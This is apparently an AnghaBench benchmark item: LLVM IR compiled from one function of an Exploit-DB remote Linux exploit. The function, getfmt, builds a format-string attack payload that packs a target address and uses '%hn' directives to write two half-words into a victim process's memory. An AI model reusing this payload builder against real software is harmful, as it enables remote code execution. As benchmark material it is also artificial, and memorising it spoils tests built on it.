; ModuleID = '/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22830.c_getfmt.c'
source_filename = "/home/carl/AnghaBench/exploitdb/exploits/linux/remote/extr_22830.c_getfmt.c"
target datalayout = "e-m:e-p270:32:32-p271:32:32-p272:64:64-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.TYPE_2__ = type { i32, i32, i32 }

@target = common dso_local global %struct.TYPE_2__* null, align 8
@pt = common dso_local global i64 0, align 8
@FMTSIZE = common dso_local global i64 0, align 8
@.str = private unnamed_addr constant [35 x i8] c"getfmt(): allocating memory failed\00", align 1
@.str.1 = private unnamed_addr constant [11 x i8] c"\00\00\00\00\00\00\00\00\03\04\00", align 1
@.str.2 = private unnamed_addr constant [43 x i8] c"%c%c%c%c%c%c%c%c%%.%dd%%%d$hn%%.%dd%%%d$hn\00", align 1

; Function Attrs: noinline nounwind optnone uwtable
define dso_local i8* @getfmt(i32 %0, i32 %1, i32 %2) #0 {
  %4 = alloca i32, align 4
  %5 = alloca i32, align 4
  %6 = alloca i32, align 4
  %7 = alloca i32, align 4
  %8 = alloca i32, align 4
  %9 = alloca i32, align 4
  %10 = alloca i64, align 8
  %11 = alloca i64, align 8
  %12 = alloca i8*, align 8
  %13 = alloca [3 x i8], align 1
  store i32 %0, i32* %4, align 4
  store i32 %1, i32* %5, align 4
  store i32 %2, i32* %6, align 4
  %14 = load i32, i32* %6, align 4
  %15 = icmp ne i32 %14, 0
  br i1 %15, label %16, label %18

16:                                               ; preds = %3
  %17 = load i32, i32* %6, align 4
  br label %24

18:                                               ; preds = %3
  %19 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %20 = load i64, i64* @pt, align 8
  %21 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %19, i64 %20
  %22 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %21, i32 0, i32 0
  %23 = load i32, i32* %22, align 4
  br label %24

24:                                               ; preds = %18, %16
  %25 = phi i32 [ %17, %16 ], [ %23, %18 ]
  store i32 %25, i32* %9, align 4
  %26 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %27 = load i64, i64* @pt, align 8
  %28 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %26, i64 %27
  %29 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %28, i32 0, i32 1
  %30 = load i32, i32* %29, align 4
  %31 = load i32, i32* %4, align 4
  %32 = add nsw i32 %30, %31
  %33 = sext i32 %32 to i64
  store i64 %33, i64* %10, align 8
  %34 = load %struct.TYPE_2__*, %struct.TYPE_2__** @target, align 8
  %35 = load i64, i64* @pt, align 8
  %36 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %34, i64 %35
  %37 = getelementptr inbounds %struct.TYPE_2__, %struct.TYPE_2__* %36, i32 0, i32 2
  %38 = load i32, i32* %37, align 4
  %39 = load i32, i32* %5, align 4
  %40 = add nsw i32 %38, %39
  %41 = sub nsw i32 %40, 1
  %42 = sext i32 %41 to i64
  store i64 %42, i64* %11, align 8
  %43 = load i64, i64* %10, align 8
  %44 = and i64 %43, 4278190080
  %45 = lshr i64 %44, 24
  %46 = trunc i64 %45 to i8
  %47 = getelementptr inbounds [3 x i8], [3 x i8]* %13, i64 0, i64 0
  store i8 %46, i8* %47, align 1
  %48 = load i64, i64* %10, align 8
  %49 = and i64 %48, 16711680
  %50 = lshr i64 %49, 16
  %51 = trunc i64 %50 to i8
  %52 = getelementptr inbounds [3 x i8], [3 x i8]* %13, i64 0, i64 1
  store i8 %51, i8* %52, align 1
  %53 = load i64, i64* %10, align 8
  %54 = and i64 %53, 65280
  %55 = lshr i64 %54, 8
  %56 = trunc i64 %55 to i8
  %57 = getelementptr inbounds [3 x i8], [3 x i8]* %13, i64 0, i64 2
  store i8 %56, i8* %57, align 1
  %58 = load i64, i64* %10, align 8
  %59 = and i64 %58, 255
  %60 = trunc i64 %59 to i8
  %61 = getelementptr inbounds [3 x i8], [3 x i8]* %13, i64 0, i64 3
  store i8 %60, i8* %61, align 1
  %62 = load i64, i64* %11, align 8
  %63 = and i64 %62, 4294901760
  %64 = lshr i64 %63, 16
  %65 = trunc i64 %64 to i32
  store i32 %65, i32* %8, align 4
  %66 = load i64, i64* %11, align 8
  %67 = and i64 %66, 65535
  %68 = trunc i64 %67 to i32
  store i32 %68, i32* %7, align 4
  %69 = load i64, i64* @FMTSIZE, align 8
  %70 = add nsw i64 %69, 1
  %71 = call i64 @malloc(i64 %70)
  %72 = inttoptr i64 %71 to i8*
  store i8* %72, i8** %12, align 8
  %73 = icmp ne i8* %72, null
  br i1 %73, label %76, label %74

74:                                               ; preds = %24
  %75 = call i32 @printe(i8* getelementptr inbounds ([35 x i8], [35 x i8]* @.str, i64 0, i64 0), i32 1)
  br label %76

76:                                               ; preds = %74, %24
  %77 = load i8*, i8** %12, align 8
  %78 = load i64, i64* @FMTSIZE, align 8
  %79 = add nsw i64 %78, 1
  %80 = call i32 @memset(i8* %77, i32 0, i64 %79)
  %81 = load i8*, i8** %12, align 8
  %82 = call i32 @memcpy(i8* %81, i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.1, i64 0, i64 0), i32 10)
  %83 = load i32, i32* %8, align 4
  %84 = load i32, i32* %7, align 4
  %85 = icmp ult i32 %83, %84
  br i1 %85, label %86, label %117

86:                                               ; preds = %76
  %87 = load i8*, i8** %12, align 8
  %88 = getelementptr inbounds i8, i8* %87, i64 10
  %89 = getelementptr inbounds [3 x i8], [3 x i8]* %13, i64 0, i64 3
  %90 = load i8, i8* %89, align 1
  %91 = sext i8 %90 to i32
  %92 = add nsw i32 %91, 2
  %93 = trunc i32 %92 to i8
  %94 = getelementptr inbounds [3 x i8], [3 x i8]* %13, i64 0, i64 2
  %95 = load i8, i8* %94, align 1
  %96 = getelementptr inbounds [3 x i8], [3 x i8]* %13, i64 0, i64 1
  %97 = load i8, i8* %96, align 1
  %98 = getelementptr inbounds [3 x i8], [3 x i8]* %13, i64 0, i64 0
  %99 = load i8, i8* %98, align 1
  %100 = getelementptr inbounds [3 x i8], [3 x i8]* %13, i64 0, i64 3
  %101 = load i8, i8* %100, align 1
  %102 = getelementptr inbounds [3 x i8], [3 x i8]* %13, i64 0, i64 2
  %103 = load i8, i8* %102, align 1
  %104 = getelementptr inbounds [3 x i8], [3 x i8]* %13, i64 0, i64 1
  %105 = load i8, i8* %104, align 1
  %106 = getelementptr inbounds [3 x i8], [3 x i8]* %13, i64 0, i64 0
  %107 = load i8, i8* %106, align 1
  %108 = load i32, i32* %8, align 4
  %109 = sub i32 %108, 8
  %110 = load i32, i32* %9, align 4
  %111 = load i32, i32* %7, align 4
  %112 = load i32, i32* %8, align 4
  %113 = sub i32 %111, %112
  %114 = load i32, i32* %9, align 4
  %115 = add i32 %114, 1
  %116 = call i32 @sprintf(i8* %88, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.2, i64 0, i64 0), i8 signext %93, i8 signext %95, i8 signext %97, i8 signext %99, i8 signext %101, i8 signext %103, i8 signext %105, i8 signext %107, i32 %109, i32 %110, i32 %113, i32 %115)
  br label %148

117:                                              ; preds = %76
  %118 = load i8*, i8** %12, align 8
  %119 = getelementptr inbounds i8, i8* %118, i64 10
  %120 = getelementptr inbounds [3 x i8], [3 x i8]* %13, i64 0, i64 3
  %121 = load i8, i8* %120, align 1
  %122 = sext i8 %121 to i32
  %123 = add nsw i32 %122, 2
  %124 = trunc i32 %123 to i8
  %125 = getelementptr inbounds [3 x i8], [3 x i8]* %13, i64 0, i64 2
  %126 = load i8, i8* %125, align 1
  %127 = getelementptr inbounds [3 x i8], [3 x i8]* %13, i64 0, i64 1
  %128 = load i8, i8* %127, align 1
  %129 = getelementptr inbounds [3 x i8], [3 x i8]* %13, i64 0, i64 0
  %130 = load i8, i8* %129, align 1
  %131 = getelementptr inbounds [3 x i8], [3 x i8]* %13, i64 0, i64 3
  %132 = load i8, i8* %131, align 1
  %133 = getelementptr inbounds [3 x i8], [3 x i8]* %13, i64 0, i64 2
  %134 = load i8, i8* %133, align 1
  %135 = getelementptr inbounds [3 x i8], [3 x i8]* %13, i64 0, i64 1
  %136 = load i8, i8* %135, align 1
  %137 = getelementptr inbounds [3 x i8], [3 x i8]* %13, i64 0, i64 0
  %138 = load i8, i8* %137, align 1
  %139 = load i32, i32* %7, align 4
  %140 = sub i32 %139, 8
  %141 = load i32, i32* %9, align 4
  %142 = add i32 %141, 1
  %143 = load i32, i32* %8, align 4
  %144 = load i32, i32* %7, align 4
  %145 = sub i32 %143, %144
  %146 = load i32, i32* %9, align 4
  %147 = call i32 @sprintf(i8* %119, i8* getelementptr inbounds ([43 x i8], [43 x i8]* @.str.2, i64 0, i64 0), i8 signext %124, i8 signext %126, i8 signext %128, i8 signext %130, i8 signext %132, i8 signext %134, i8 signext %136, i8 signext %138, i32 %140, i32 %142, i32 %145, i32 %146)
  br label %148

148:                                              ; preds = %117, %86
  %149 = load i8*, i8** %12, align 8
  ret i8* %149
}

declare dso_local i64 @malloc(i64) #1

declare dso_local i32 @printe(i8*, i32) #1

declare dso_local i32 @memset(i8*, i32, i64) #1

declare dso_local i32 @memcpy(i8*, i8*, i32) #1

declare dso_local i32 @sprintf(i8*, i8*, i8 signext, i8 signext, i8 signext, i8 signext, i8 signext, i8 signext, i8 signext, i8 signext, i32, i32, i32, i32) #1

attributes #0 = { noinline nounwind optnone uwtable "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "min-legal-vector-width"="0" "no-infs-fp-math"="false" "no-jump-tables"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }
attributes #1 = { "correctly-rounded-divide-sqrt-fp-math"="false" "disable-tail-calls"="false" "frame-pointer"="all" "less-precise-fpmad"="false" "no-infs-fp-math"="false" "no-nans-fp-math"="false" "no-signed-zeros-fp-math"="false" "no-trapping-math"="false" "stack-protector-buffer-size"="8" "target-cpu"="x86-64" "target-features"="+cx8,+fxsr,+mmx,+sse,+sse2,+x87" "unsafe-fp-math"="false" "use-soft-float"="false" }

!llvm.module.flags = !{!0}
!llvm.ident = !{!1}

!0 = !{i32 1, !"wchar_size", i32 4}
!1 = !{!"clang version 10.0.1 (https://github.com/wsmoses/llvm-project-tok c8e5003577614e72d6d18a216e6a09771e1fcce4)"}
